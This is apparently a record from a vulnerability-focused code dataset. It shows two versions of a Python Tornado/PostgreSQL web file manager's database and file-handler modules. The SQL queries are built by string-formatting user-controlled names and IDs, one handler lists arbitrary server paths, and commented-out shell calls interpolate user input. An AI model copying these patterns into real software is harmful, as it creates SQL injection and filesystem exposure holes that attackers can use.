                src = self.locate(cmd[1], parent=cwd)
                self.move(src, cmd[2])
            elif op == 'q':
                break
            else:
                print('Unknown command ""%s"".' % op)
        return
    pass

Filesystem = FilesystemType()

################################################################################
/n/n/nbzs/module_files.py/n/n
import base64
import binascii
import io
import json
import re
import time
import tornado

from bzs import const
from bzs import db
from bzs import files
from bzs import preproc
from bzs import users

# TODO: Remove this!
import os

def encode_str_to_hexed_b64(data):
    return binascii.b2a_hex(base64.b64encode(data.encode('utf-8'))).decode('utf-8')
def decode_hexed_b64_to_str(data):
    return base64.b64decode(binascii.unhexlify(data.encode('utf-8'))).decode('utf-8')

################################################################################

class FilesListHandler(tornado.web.RequestHandler):
    SUPPORTED_METHODS = ['GET', 'HEAD']

    @tornado.web.asynchronous
    @tornado.gen.coroutine
    def get(self, target_path):
        """"""/files/list/HEXED_BASE64_STRING_OF_PATH/""""""
        # Another concurrency blob...
        future = tornado.concurrent.Future()

        def get_final_html_async(target_path):
            # Getting file template.
            file_temp = files.get_static_data('./static/files.html')

            # Retrieving list operation target.
            try:
                target_path = decode_hexed_b64_to_str(target_path)
            except:
                target_path = '/'
            if not target_path:
                target_path = '/'

            # Getting hierarchical file path
            files_hierarchy = target_path.split('/')
            files_hierarchy_list = list()
            while '' in files_hierarchy:
                files_hierarchy.remove('')
            files_hierarchy = [''] + files_hierarchy
            files_hierarchy_cwd = ''
            for i in range(0, len(files_hierarchy)):
                files_hierarchy[i] += '/'
                files_hierarchy_cwd += files_hierarchy[i]
                files_hierarchy_list.append(dict(
                    folder_name=files_hierarchy[i],
                    href_path='/files/list/%s' % encode_str_to_hexed_b64(files_hierarchy_cwd),
                    disabled=(i == len(files_hierarchy) - 1)))
                continue

            # Getting current directory content
            files_attrib_list = list()
            for f_handle in db.Filesystem.listdir(target_path):
                try:
                    file_name = f_handle['file-name']
                    actual_path = target_path + file_name
                    attrib = dict()
                    attrib['file-name'] = file_name
                    attrib['file-size'] = f_handle['file-size']
                    attrib['owner'] = f_handle['owner']
                    attrib['date-uploaded'] = time.strftime(const.get_const('time-format'), time.localtime(f_handle['upload-time']))
                    # Encoding MIME types
                    if f_handle['is-dir']:
                        attrib['mime-type'] = 'directory/folder'
                    else:
                        attrib['mime-type'] = files.guess_mime_type(file_name)
                    attrib['file-name'] = f_handle['file-name']
                    # Encoding hyperlinks
                    if attrib['mime-type'] == 'directory/folder':
                        attrib['target-link'] = '/files/list/%s' % encode_str_to_hexed_b64(actual_path + '/')
                    else:
                        attrib['target-link'] = '/files/download/%s/%s' % (encode_str_to_hexed_b64(actual_path), file_name)
                    attrib['uuid'] = encode_str_to_hexed_b64(actual_path)
                    files_attrib_list.append(attrib)
                except Exception:
                    pass
            cwd_uuid = encode_str_to_hexed_b64(files_hierarchy_cwd)

            # File actually exists, sending data
            working_user = users.get_user_by_cookie(
                self.get_cookie('user_active_login', default=''))
            file_temp = preproc.preprocess_webpage(file_temp, working_user,
                files_attrib_list=files_attrib_list,
                files_hierarchy_list=files_hierarchy_list,
                cwd_uuid=cwd_uuid)
            future.set_result(file_temp)
        tornado.ioloop.IOLoop.instance().add_callback(get_final_html_async,
            target_path)
        file_temp = yield future

        self.set_status(200, ""OK"")
        self.add_header('Cache-Control', 'max-age=0')
        self.add_header('Connection', 'close')
        self.add_header('Content-Type', 'text/html')
        self.add_header('Content-Length', str(len(file_temp)))
        self.write(file_temp)
        self.flush()
        self.finish()
        return self

    head=get
    pass

################################################################################

class FilesDownloadHandler(tornado.web.RequestHandler):
    SUPPORTED_METHODS = ['GET', 'HEAD']

    @tornado.web.asynchronous
    @tornado.gen.coroutine
    def get(self, file_path, file_name):
        # Something that I do not wish to write too many times..
        def invoke_404():
            self.set_status(404, ""Not Found"")
            self._headers = tornado.httputil.HTTPHeaders()
            self.add_header('Content-Length', '0')
            self.flush()
            return

        # Get file location (exactly...)
        try:
            file_path = decode_hexed_b64_to_str(file_path)
        except Exception:
            file_path = ''
        if not file_path:
            invoke_404()
            return

        # Asynchronous web request...
        file_block_size = 64 * 1024 # 64 KiB / Chunk
        file_block = bytes()
        file_data = None

        future = tornado.concurrent.Future()
        def inquire_data_async():
            _tf_data = db.Filesystem.get_content(file_path)
            future.set_result(_tf_data)
        tornado.ioloop.IOLoop.instance().add_callback(inquire_data_async)
        file_data = yield future
        file_stream = io.BytesIO(file_data)

        self.set_status(200, ""OK"")
        self.add_header('Cache-Control', 'max-age=0')
        self.add_header('Connection', 'close')
        self.add_header('Content-Type', 'application/x-download')
        self.add_header('Content-Length', str(len(file_data)))

        while file_stream.tell() < len(file_data):
            byte_pos = file_stream.tell()
            # Entry to the concurrency worker
            future = tornado.concurrent.Future()
            # Concurrent worker
            def retrieve_data_async():
                block = file_stream.read(file_block_size)
                future.set_result(block)
            # Injection and pending
            tornado.ioloop.IOLoop.instance().add_callback(retrieve_data_async)
            # Reset or read
            file_block = yield future
            self.write(file_block)
            file_block = None
            self.flush()
        file_block = None
        self.finish()

        # Release memory...
        file_stream = None
        file_data = None
        return self

    head=get
    pass

################################################################################

class FilesOperationHandler(tornado.web.RequestHandler):
    SUPPORTED_METHODS = ['POST']

    @tornado.web.asynchronous
    @tornado.gen.coroutine
    def post(self):
        # Another concurrency blob...
        future = tornado.concurrent.Future()

        def get_final_html_async():
            operation_content_raw = self.request.body
            operation_content = json.loads(operation_content_raw.decode('utf-8', 'ignore'))
            action = operation_content['action']
            sources = operation_content['source']
            if type(sources) == list:
                for i in range(0, len(sources)):
                    try:
                        sources[i] = decode_hexed_b64_to_str(sources[i])
                    except:
                        pass
            else:
                sources = decode_hexed_b64_to_str(sources)
            if action in ['copy', 'move']:
                try:
                    target = decode_hexed_b64_to_str(operation_content['target'])
                except:
                    target = '/'
            elif action in ['rename', 'new-folder']:
                try:
                    target = operation_content['target']
                except:
                    target = sources # I am not handling more exceptions as this is brutal enough
            # Done assigning values, now attempting to perform operation
            if action == 'copy':
                for source in sources:
                    # os.system('cp ""D:%s"" ""D:%s""' % (source, target))
                    print('copy', source, target)
                    db.Filesystem.copy(source, target, new_owner='user-cp')
            elif action == 'move':
                for source in sources:
                    # os.system('mv ""D:%s"" ""D:%s""' % (source, target))
                    print('move', source, target)
                    db.Filesystem.move(source, target)
            elif action == 'delete':
                for source in sources:
                    # os.system('rm ""D:%s""' % source)
                    print('delete', source)
                    db.Filesystem.remove(source)
            elif action == 'rename':
                # os.system('rename ""D:%s"" ""%s""' % (sources, target))
                print('rename', sources, target)
                db.Filesystem.rename(sources, target)
                print(db.Filesystem.listdir('/'))
            elif action == 'new-folder':
                # os.system('mkdir ""D:%s%s""' % (sources, target))
                print('mkdir', sources)
                db.Filesystem.mkdir(sources, target, 'user-nf')
            future.set_result('')
        tornado.ioloop.IOLoop.instance().add_callback(get_final_html_async)
        file_temp = yield future

        self.set_status(200, ""OK"")
        self.add_header('Cache-Control', 'max-age=0')
        self.add_header('Connection', 'close')
        self.add_header('Content-Type', 'text/html')
        self.add_header('Content-Length', str(len(file_temp)))
        self.write(file_temp)
        self.flush()
        self.finish()
        return self
    pass

################################################################################

class FilesUploadHandler(tornado.web.RequestHandler):
    SUPPORTED_METHODS = ['POST']

    @tornado.web.asynchronous
    @tornado.gen.coroutine
    def post(self, target_path, file_name):
        # Another concurrency blob...
        future = tornado.concurrent.Future()

        def save_file_async(alter_ego, target_path, file_name):
            upload_data = alter_ego.request.body
            target_path = decode_hexed_b64_to_str(target_path)
            # Committing changes to database
            db.Filesystem.mkfile(target_path, file_name, 'user', upload_data)
            # Final return
            future.set_result('bzs_upload_success')
        tornado.ioloop.IOLoop.instance().add_callback(save_file_async,
            self, target_path, file_name)

        response_temp = yield future
        self.set_status(200, ""OK"")
        self.add_header('Cache-Control', 'max-age=0')
        self.add_header('Connection', 'close')
        self.add_header('Content-Type', 'text/html')
        self.add_header('Content-Length', str(len(response_temp)))
        self.write(response_temp)
        self.flush()
        self.finish()
        return self
    pass
/n/n/n",0
17,17,fa76c130ed80b9f5636cab41e88054536205c376,"/bzs/db.py/n/n
import binascii
import copy
import datetime
import hashlib
import psycopg2
import pytz
import time
import uuid

from bzs import const

def get_current_time():
    """"""Gets the current time, in float since epoch.""""""
    # return datetime.datetime.now(tz=pytz.timezone(const.get_const('time-zone')))
    return float(time.time())

def get_new_uuid(uuid_, uuid_list=None):
    """"""Creates a new UUID that is not in 'uuid_list' if given.""""""
    if not uuid_:
        uuid_ = uuid.uuid4().hex
        if type(uuid_list) in [set, dict]:
            while uuid_ in uuid_list:
                uuid_ = uuid.uuid4().hex
    return uuid_

################################################################################

class DatabaseType:
    def __init__(self):
        self.connect_params = dict(
            database=const.get_const('db-name'),
            user=const.get_const('db-user'),
            password=const.get_const('db-password'),
            host=const.get_const('db-host-addr'),
            port=const.get_const('db-host-port')
        )
        self._db = psycopg2.connect(**self.connect_params)
        self._cur = None
        return

    def execute(self, command, **args):
        self._cur = self._db.cursor()
        try:
            self._cur.execute(command, **args)
            final_arr = self._cur.fetchall()
        except psycopg2.ProgrammingError:
            # We'll take this as granted... though risky.
            final_arr = None
        self._db.commit()
        self._cur.close()
        return final_arr

    def init_db(self):
        # Purge database of obsolete tables
        self.execute(""""""
            DROP TABLE core;
        """""")
        self.execute(""""""
            DROP TABLE users;
        """""")
        self.execute(""""""
            DROP TABLE file_system;
        """""")
        self.execute(""""""
            DROP TABLE file_storage;
        """""")
        # Creating new tables in order to function
        self.execute(""""""
            CREATE TABLE core (
                index   TEXT,
                data    BYTEA
            );
            CREATE TABLE users (
                handle          TEXT,
                password        TEXT,
                usergroups      TEXT,
                ip_address      TEXT[],
                events          TEXT[],
                usr_name        TEXT,
                usr_description TEXT,
                usr_email       TEXT,
                usr_followers   TEXT[],
                usr_friends     TEXT[]
            );
            CREATE TABLE file_system(
                uuid        TEXT,
                file_name   TEXT,
                owner       TEXT,
                upload_time DOUBLE PRECISION,
                sub_folders TEXT[],
                sub_files   TEXT[][]
            );
            CREATE TABLE file_storage (
                uuid    TEXT,
                size    BIGINT,
                count   BIGINT,
                hash    TEXT,
                content BYTEA
            );
        """""")
        return
    pass

Database = DatabaseType()

################################################################################

class FileStorageType:
    st_uuid_idx = dict()
    st_hash_idx = dict()
    # Database entry
    st_db = Database
    # Hashing algorithm, could be md5, sha1, sha224, sha256, sha384, sha512
    # sha384 and sha512 are not recommended due to slow speeds on 32-bit computers
    hash_algo = hashlib.sha256

    class UniqueFile:
        def __init__(self, uuid_=None, size=0, count=1, hash_=None, master=None):
            self.master = master
            self.uuid = get_new_uuid(uuid_, self.master.st_uuid_idx)
            self.master.st_uuid_idx[self.uuid] = self
            self.size = size
            self.count = count # The number of references
            self.hash = hash_ # Either way... must specify this!
            self.master.st_hash_idx[self.hash] = self
            # Will not contain content, would be indexed in SQL.
            return
        pass

    def __init__(self, db=Database):
        return self.load_sql(db)

    def load_sql(self, db=Database):
        """"""Loads index of all stored UniqueFiles in database.""""""
        self.st_db = db
        for item in self.st_db.execute(""SELECT uuid, size, count, hash FROM file_storage;""):
            s_uuid, s_size, s_count, s_hash = item
            s_fl = self.UniqueFile(s_uuid, s_size, s_count, s_hash, self)
            # Inject into indexer
            self.st_uuid_idx[s_uuid] = s_fl
            self.st_hash_idx[s_hash] = s_fl
        return

    def new_unique_file(self, content):
        """"""Creates a UniqueFile, and returns its UUID in string.""""""
        n_uuid = get_new_uuid(None, self.st_uuid_idx)
        n_size = len(content)
        n_count = 1
        n_hash = self.hash_algo(content).hexdigest()
        u_fl = self.UniqueFile(n_uuid, n_size, n_count, n_hash, master=self)
        # Done indexing, now proceeding to process content into SQL
        content = binascii.hexlify(content).decode('ascii')
        # self.st_db.execute('INSERT INTO file_storage (uuid, size, count, hash, content) VALUES (""%s"", %d, %d, ""%s"", E""\\\\x%s"");' % (n_uuid, n_size, n_count, n_hash, content))
        self.st_db.execute(""INSERT INTO file_storage (uuid, size, count, hash, content) VALUES ('%s', %d, %d, '%s', E'\\x%s');"" % (n_uuid, n_size, n_count, n_hash, content))
        # Injecting file into main indexer
        self.st_uuid_idx[n_uuid] = u_fl
        self.st_hash_idx[n_hash] = u_fl
        return n_uuid

    def get_content(self, uuid_):
        try:
            u_fl = self.st_uuid_idx[uuid_]
        except Exception:
            return b''
        # Got file handle, now querying file data
        content = self.st_db.execute(""SELECT content FROM file_storage WHERE uuid = '%d';"" % uuid_)
        return content
    pass

FileStorage = FileStorageType()

################################################################################

class FilesystemType:
    """"""This is a virtual filesystem based on a relational PostgreSQL database.
    We might call it a SQLFS. Its tree-topological structure enables it to index
    files and find siblings quickly. Yet without the B-Tree optimization it would
    not be easy to maintain a high performance.
    """"""
    fs_uuid_idx = dict()
    fs_root = None
    fs_db = None

    class fsNode:
        """"""This is a virtual node on a virtual filesystem SQLFS. The virtual node contains
        the following data:

            uuid        - The unique identifier: if node is a directory, then this uuid
                          would be the identifier pointing to the directory; if node is
                          a file, this identifier would be pointing to the UUID among
                          the actual files instead of the filesystem.
            is_dir      - Whether is a directory or not
            filename    - The actual file / directory name given by the user
            upload_time - The time uploaded / copied / moved to server
            f_uuid      - If a file them this indicates its FileStorage UUID.

        Other data designed to maintain the structure of the node includes:

            master        - The filesystem itself.
            sub_folder    - Removed after filesystem init, temporary use only.
            sub_files     - Removed after filesystem init, temporary use only.
            sub_items     - Set of children.
            sub_names_idx - Contains same data as sub_items, but indexed by name.

        Do process with caution, and use exported methods only.
        """"""

        def __init__(self, is_dir, file_name, owner, uuid_=None, upload_time=None, sub_folders=set(), sub_files=set(), f_uuid=None, master=None):
            # The filesystem / master of the node
            self.master = master
            # Assigning data
            self.is_dir = is_dir
            self.file_name = file_name
            self.owner = owner
            # Generate Universally Unique Identifier
            self.uuid = get_new_uuid(uuid_, master.fs_uuid_idx)
            master.fs_uuid_idx[self.uuid] = self
            # Get upload time
            self.upload_time = upload_time or get_current_time()
            if not self.is_dir:
                self.sub_folders = set()
                self.sub_files = set()
                self.f_uuid = f_uuid
            else:
                # Folder initialization needs to be accounted after init as whole by the main caller
                self.sub_folders = sub_folders # Temporary
                self.sub_files = sub_files # Temporary
            # This is a traversal thing...
            self.parent = None
            self.sub_items = set()
            self.sub_names_idx = dict()
            return
        pass

    def __init__(self, db=Database):
        return self.load_sqlfs(db)

    def load_sqlfs(self, db=Database):
        self.fs_db = db
        for item in self.fs_db.execute(""SELECT uuid, file_name, owner, upload_time, sub_folders, sub_files FROM file_system""):
            # Splitting tuple into parts
            uuid_, file_name, owner, upload_time, sub_folders, sub_files = item
            # Getting sub files which are expensive stored separately
            n_sub_files = set()
            for fil_idx in sub_files:
                # This is where the order goes, BEAWARE
                s_uuid = fil_idx[0]
                s_file_name = fil_idx[1]
                s_owner = fil_idx[2]
                try:
                    s_upload_time = float(fil_idx[3])
                except:
                    s_upload_time = get_current_time()
                s_f_uuid = fil_idx[4]
                # Pushing...
                s_file = self.fsNode(False, s_file_name, s_owner, s_uuid, s_upload_time, f_uuid=s_f_uuid, master=self)
                n_sub_files.add(s_file)
                self.fs_uuid_idx[s_uuid] = s_file
            # Getting sub folders as a set but not templating them
            n_sub_folders = set() # Since reference is passed, should not manipulate this further
            for fol_idx in sub_folders:
                n_sub_folders.add(fol_idx)
            fold_elem = self.fsNode(True, file_name, owner, uuid_, upload_time, n_sub_folders, n_sub_files, master=self)
            self.fs_uuid_idx[uuid_] = fold_elem
        # Done importing from SQL database, now attempting to refurbish connexions
        for uuid_ in self.fs_uuid_idx:
            item = self.fs_uuid_idx[uuid_]
            if not item.is_dir:
                continue
            # Asserted that it was a folder.
            for n_sub in item.sub_files:
                item.sub_items.add(n_sub)
                item.sub_names_idx[n_sub.file_name] = n_sub
            for n_sub_uuid in item.sub_folders:
                try:
                    n_sub = self.fs_uuid_idx[n_sub_uuid]
                    item.sub_items.add(n_sub)
                    item.sub_names_idx[n_sub.file_name] = n_sub
                except Exception:
                    pass
            del item.sub_files
            del item.sub_folders
        # Fixing parental occlusions
        def iterate_fsnode(node):
            for item in node.sub_items:
                if item.parent:
                    continue
                # Never iterated before
                item.parent = node
                iterate_fsnode(item)
            return
        for uuid_ in self.fs_uuid_idx: # This would fix all nodes...
            item = self.fs_uuid_idx[uuid_]
            iterate_fsnode(item)
        # Finding root and finishing parent connexions
        for uuid_ in self.fs_uuid_idx: # Takes the first element that ever occured to me
            item = self.fs_uuid_idx[uuid_]
            while item.parent:
                item = item.parent
            self.fs_root = item
            break
        else:
            self.make_root()
        # Traversing root for filename indexing
        def iterate_node_fn(node):
            for item in node.sub_items:
                node.sub_names_idx[item.file_name]
        # All done, finished initialization
        return

    def make_root(self):
        item = self.fsNode(True, '', 'System', master=self)
        del item.sub_files
        del item.sub_folders
        item.sub_items = set()
        item.parent = None
        # Done generation, inserting.
        self.fs_root = item
        self.fs_uuid_idx[item.uuid] = item
        # Inserting to SQL.
        self.fs_db.execute(""INSERT INTO file_system (uuid, file_name, owner, upload_time, sub_folders, sub_files) VALUES ('%s', '%s', '%s', %f, '{}', '{}');"" % (item.uuid, item.file_name, item.owner, item.upload_time))
        return

    def locate(self, path, parent=None):
        """"""Locate the fsNode() of the location 'path'. If 'parent' is given and
        as it should be a fsNode(), the function look to the nodes directly
        under this, non-recursively.""""""
        # On the case it is a referring location, path should be str.
        if parent:
            try:
                item = parent.sub_names_idx[path]
            except Exception:
                return None
            return item
        # And it is not such a location.
        # We assert that path should be list().
        if type(path) == str:
            path = path.split('/')
            while '' in path:
                path.remove('')
        # Now got array, traversing...
        item = self.fs_root
        while path:
            try:
                item = item.sub_names_idx[path[0]]
            except Exception:
                return None # This object does not exist.
            path = path[1:]
        return item

    def _sqlify_fsnode(self, item):
        n_uuid = item.uuid
        n_file_name = item.file_name
        n_owner = item.owner
        n_upload_time = item.upload_time
        n_sub_folders = list()
        n_sub_files = list()
        for i_sub in item.sub_items:
            if i_sub.is_dir:
                n_sub_folders.append(""\""%s\"""" % i_sub.uuid)
            else:
                s_attr = ""{%s, %s, %s, %s, %s}"" % (
                    ""\""%s\"""" % i_sub.uuid,
                    ""\""%s\"""" % i_sub.file_name,
                    ""\""%s\"""" % i_sub.owner,
                    ""\""%f\"""" % i_sub.upload_time,
                    ""\""%s\"""" % i_sub.f_uuid
                )
                n_sub_files.append(s_attr)
        # Formatting string
        n_sub_folders_str = ""'{"" + "", "".join(i for i in n_sub_folders) + ""}'""
        n_sub_files_str = ""'{"" + "", "".join(i for i in n_sub_files) + ""}'""
        return (n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str)

    def _update_in_db(self, item):
        # This applies to items in the
        # We assert that item should be Node.
        if type(item) == str:
            item = self.locate(item)
        if not item:
            return False
        # Giving a few but crucial assertions...
        if not item.is_dir:
            item = item.parent
            if not item.is_dir:
                return False # I should raise, by a matter of fact
        # Collecting data
        n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str = self._sqlify_fsnode(item)
        # Uploading / committing data
        command = ""UPDATE file_system SET file_name = '%s', owner = '%s', upload_time = %f, sub_folders = %s, sub_files = %s WHERE uuid = '%s';"" % (n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str, n_uuid)
        self.fs_db.execute(command)
        return True

    def _insert_in_db(self, item):
        """"""Create filesystem record of directory 'item' inside database.""""""
        if not item.is_dir:
            return False # Must be directory...
        n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str = self._sqlify_fsnode(item)
        # Uploading / committing data
        self.fs_db.execute(""INSERT INTO file_system (uuid, file_name, owner, upload_time, sub_folders, sub_files) VALUES ('%s', '%s', '%s', %f, %s, %s);"" % (n_uuid, n_file_name, n_owner, n_upload_time, n_sub_folders_str, n_sub_files_str))
        return

    def get_content(self, item):
        """"""Gets binary content of the object (must be file) and returns the actual
        content in bytes.""""""
        if type(item) == str:
            item = self.locate(item)
        if not item:
            return b''
        if item.is_dir:
            return b''
        return FileStorage.get_content(item.f_uuid)

    def _remove_recursive(self, item):
        """"""Removes content of a single object and recursively call all its
        children for recursive removal.""""""
        # We assert item is fsNode().
        # Remove recursively.
        for i_sub in item.sub_items:
            self._remove_recursive(i_sub)
        # Delete itself from filesystem.
        del self.fs_uuid_idx[item.uuid]
        # Delete itself from SQL database.
        self.fs_db.execute(""DELETE FROM file_system WHERE uuid = '%s';"" % item.uuid)
        return

    def remove(self, path):
        """"""Removes (recursively) all content of the folder / file itself and
        all its subdirectories.""""""
        if type(path) == str:
            path = self.locate(path)
            if not path:
                return False
        # Done assertion, path is now fsNode().
        par = path.parent
        self._remove_recursive(path)
        if par:
            par.sub_items.remove(path)
            del par.sub_names_idx[path.file_name]
            self._update_in_db(par)
        return True

    def _copy_recursive(self, item, target_par, new_owner):
        """"""Copies content of a single object and recursively call all its
        children for recursive copy, targeted as a child under target_par.""""""
        # We assert item, target_par are all fsNode().
        target_node = target_par.sub_names_idx[item.file_name]
        for i_sub in item.sub_items:
            i_sub.parent = item
            item.sub_names_idx[i_sub.file_name] = i_sub
            self._copy_recursive(i_sub, target_node, new_owner)
        # Insert into SQL database
        item.uuid = get_new_uuid(None, self.fs_uuid_idx)
        self.fs_uuid_idx[item.uuid] = item
        item.upload_time = get_current_time()
        if new_owner:
            item.owner = new_owner # Assignment
        if item.is_dir:
            self._insert_in_db(item)
        return

    def copy(self, source, target_parent, new_owner=None):
        """"""Copies content of 'source' (recursively) and hang the target object
        that was copied under the node 'target_parent'. If rename required please call
        the related functions separatedly.""""""
        if type(source) == str:
            source = self.locate(source)
        if type(target_parent) == str:
            target_parent = self.locate(target_parent)
        if not source or not target_parent:
            return False
        # Done assertion, now proceed with deep copy
        target = copy.deepcopy(source)
        target.parent = target_parent
        target_parent.sub_items.add(target)
        target_parent.sub_names_idx[target.file_name] = target
        self._copy_recursive(target, target_parent, new_owner)
        # Update target_parent data and return
        self._update_in_db(target_parent)
        return True

    def move(self, source, target_parent):
        if type(source) == str:
            source = self.locate(source)
        if type(target_parent) == str:
            target_parent = self.locate(target_parent)
        if not source or not target_parent:
            return False
        # Moving an re-assigning tree structures
        par = source.parent
        par.sub_items.remove(source)
        del par.sub_names_idx[source.file_name]
        source.parent = target_parent
        target_parent.sub_items.add(source)
        target_parent.sub_names_idx[source.file_name] = source
        # Updating SQL database.
        self._update_in_db(par)
        self._update_in_db(target_parent)
        return

    def rename(self, item, file_name):
        """"""Renames object 'item' into file_name.""""""
        if type(item) == str:
            item = self.locate(item)
            if not item:
                return False
        if item.parent:
            del item.parent.sub_names_idx[item.file_name]
            item.file_name = file_name
            item.parent.sub_names_idx[item.file_name] = item
        if item.is_dir:
            self._update_in_db(item)
        else:
            self._update_in_db(item.parent)
        return True

    def chown(self, item, owner):
        """"""Assign owner of 'item' to new owner, recursively.""""""
        if type(item) == str:
            item = self.locate(item)
            if not item:
                return False
        def _chown_recursive(item_, owner_):
            for sub_ in item_.sub_items:
                _chown_recursive(sub_, owner_)
            item_.owner = owner_
            if item_.is_dir:
                self._update_in_db(item_)
            return
        _chown_recursive(item, owner)
        if not item.is_dir:
            self._update_in_db(item.parent)
        return True

    def mkfile(self, path_parent, file_name, owner, content):
        """"""Inject object into filesystem, while passing in content. The content
        itself would be indexed in FileStorage.""""""
        if type(path_parent) == str:
            path_parent = self.locate(path_parent)
            if not path_parent:
                return False
        n_uuid = FileStorage.new_unique_file(content)
        n_fl = self.fsNode(False, file_name, owner, f_uuid=n_uuid, master=self)
        # Updating tree connexions
        n_fl.parent = path_parent
        path_parent.sub_items.add(n_fl)
        path_parent.sub_names_idx[file_name] = n_fl
        self._update_in_db(path_parent)
        # Indexing and return
        self.fs_uuid_idx[n_fl.uuid] = n_fl
        return True

    def mkdir(self, path_parent, file_name, owner):
        """"""Inject folder into filesystem.""""""
        if type(path_parent) == str:
            path_parent = self.locate(path_parent)
            if not path_parent:
                return False
        n_fl = self.fsNode(True, file_name, owner, master=self)
        # Updating tree connexions
        n_fl.parent = path_parent
        path_parent.sub_items.add(n_fl)
        path_parent.sub_names_idx[file_name] = n_fl
        self._update_in_db(path_parent)
        self._insert_in_db(n_fl)
        # Indexing and return
        self.fs_uuid_idx[n_fl.uuid] = n_fl
        return True

    def listdir(self, path):
        """"""Creates a list of files in the directory 'path'. Attributes of the returned
        result contains:

            file-name   - File name
            file-size   - File size
            is-dir      - Whether is directory
            owner       - The handle of the owner
            upload-time - Time uploaded, in float since epoch.

        The result should always be a list, and please index it with your own
        habits or modify the code.""""""
        if type(path) == str:
            path = self.locate(path)
            if not path:
                return []
        # List directory, given the list(dict()) result...
        dirs = list()
        for item in path.sub_items:
            attrib = dict()
            # try:
            attrib['file-name'] = item.file_name
            attrib['file-size'] = 0 if item.is_dir else FileStorage.st_uuid_idx[item.f_uuid].size
            attrib['is-dir'] = item.is_dir
            attrib['owner'] = item.owner
            attrib['upload-time'] = item.upload_time
            # except:
            #     continue
            dirs.append(attrib)
        # Give the results to downstream
        return dirs

    def shell(self):
        """"""Interactive shell for manipulating SQLFS. May be integrated into other
        utilites in the (far) futuure. Possible commands are:

            ls             - List content of current directory.
            cat name       - View binary content of the object 'name'.
            cd             - Change CWD into the given directory, must be relative.
                             or use '..' to go to parent directory.
            chown src usr  - Change ownership (recursively) of object 'src' to 'usr'.
            rename src nam - Rename file / folder 'src' to 'nam'.
            mkdir name     - Make directory of 'name' under this directory.
            mkfile name    - Make empty file of 'name' under this directory.
            rm name        - Remove (recursively) object of 'name' under this directory.
            cp src dest    - Copy object 'src' to under 'dest (actual)' as destination.
            mv src dest    - Move object 'src' to under 'dest (actual)' as destination.
            q              - Exit shell.

        Would be done in a infinite loop. Use 'q' to leave.""""""
        cwd = self.fs_root
        cuser = 'system'
        cwd_list = ['']
        while True:
            cwd_fl = ''.join((i + '/') for i in cwd_list)
            print('root@postgres %s$ ' % cwd_fl, end='')
            cmd_input = input()
            cmd = cmd_input.split(' ')
            op = cmd[0]
            if op == 'ls':
                res = self.listdir(cwd)
                # Prettify the result
                print('Owner       Upload Time         Size            Filename            ')
                print('--------------------------------------------------------------------')
                for item in res:
                    print('%s%s%s%s' % (item['owner'].ljust(12), str(int(item['upload-time'])).ljust(20), str(item['file-size'] if not item['is-dir'] else '').ljust(16), item['file-name']))
                print('Total: %d' % len(res))
                print('')
            elif op == 'cat':
                dest = self.locate(cmd[1], parent=cwd)
                print(self.get_content(dest))
            elif op == 'cd':
                if cmd[1] == '..':
                    cwd_dest = cwd.parent
                    if cwd_dest:
                        cwd = cwd_dest
                        cwd_list = cwd_list[:-1]
                else:
                    cwd_dest = cwd.sub_names_idx[cmd[1]]
                    if cwd_dest:
                        cwd = cwd_dest
                        cwd_list.append(cmd[1])
            elif op == 'chown':
                dest = self.locate(cmd[1], parent=cwd)
                self.chown(dest, cmd[2])
            elif op == 'rename':
                dest = self.locate(cmd[1], parent=cwd)
                self.rename(dest, cmd[2])
            elif op == 'mkdir':
                self.mkdir(cwd, cmd[1], cuser)
            elif op == 'mkfile':
                self.mkfile(cwd, cmd[1], cuser, b'')
            elif op == 'rm':
                self.remove(self.locate(cmd[1], parent=cwd))
            elif op == 'cp':
                src = self.locate(cmd[1], parent=cwd)
                self.copy(src, cmd[2])
            elif op == 'mv':
                src = self.locate(cmd[1], parent=cwd)
                self.move(src, cmd[2])
            elif op == 'q':
                break
            else:
                print('Unknown command ""%s"".' % op)
        return
    pass

Filesystem = FilesystemType()

################################################################################
/n/n/n/bzs/module_files.py/n/n
import base64
import binascii
import io
import json
import re
import time
import tornado

from bzs import files
from bzs import const
from bzs import users
from bzs import preproc

# TODO: Remove this!
import os

def encode_str_to_hexed_b64(data):
    return binascii.b2a_hex(base64.b64encode(data.encode('utf-8'))).decode('utf-8')
def decode_hexed_b64_to_str(data):
    return base64.b64decode(binascii.unhexlify(data.encode('utf-8'))).decode('utf-8')

################################################################################

class FilesListHandler(tornado.web.RequestHandler):
    SUPPORTED_METHODS = ['GET', 'HEAD']

    @tornado.web.asynchronous
    @tornado.gen.coroutine
    def get(self, target_path):
        # Another concurrency blob...
        future = tornado.concurrent.Future()

        def get_final_html_async(target_path):
            # Getting file template.
            file_temp = files.get_static_data('./static/files.html')

            # Retrieving list target.
            try:
                target_path = decode_hexed_b64_to_str(target_path)
            except:
                target_path = '/'
            if not target_path:
                target_path = '/'

            # Getting parental directorial list
            files_hierarchy = target_path.split('/')
            files_hierarchy_list = list()
            while '' in files_hierarchy:
                files_hierarchy.remove('')
            files_hierarchy = [''] + files_hierarchy
            files_hierarchy_cwd = ''
            for i in range(0, len(files_hierarchy)):
                files_hierarchy[i] += '/'
                files_hierarchy_cwd += files_hierarchy[i]
                files_hierarchy_list.append(dict(
                    folder_name=files_hierarchy[i],
                    href_path='/files/list/%s' % encode_str_to_hexed_b64(files_hierarchy_cwd),
                    disabled=(i == len(files_hierarchy) - 1)))
                continue

            # Getting current directory content
            files_attrib_list = list()
            for file_name in os.listdir(target_path):
                try: # In case of a permission error.
                    actual_path = target_path + file_name
                    attrib = dict()
                    attrib['file-name'] = file_name
                    attrib['allow-edit'] = True
                    attrib['file-size'] = files.format_file_size(os.path.getsize(actual_path))
                    attrib['owner'] = 'root'
                    attrib['date-uploaded'] = time.ctime(os.path.getctime(actual_path))
                    # Detecting whether is a folder
                    if os.path.isdir(actual_path):
                        attrib['mime-type'] = 'directory/folder'
                    else:
                        attrib['mime-type'] = files.guess_mime_type(file_name)
                    # And access links should differ between folders and files
                    if attrib['mime-type'] == 'directory/folder':
                        attrib['target-link'] = '/files/list/%s' % encode_str_to_hexed_b64(actual_path + '/')
                    else:
                        attrib['target-link'] = '/files/download/%s/%s' % (encode_str_to_hexed_b64(actual_path), file_name)
                    attrib['uuid'] = encode_str_to_hexed_b64(actual_path)
                    files_attrib_list.append(attrib)
                except Exception:
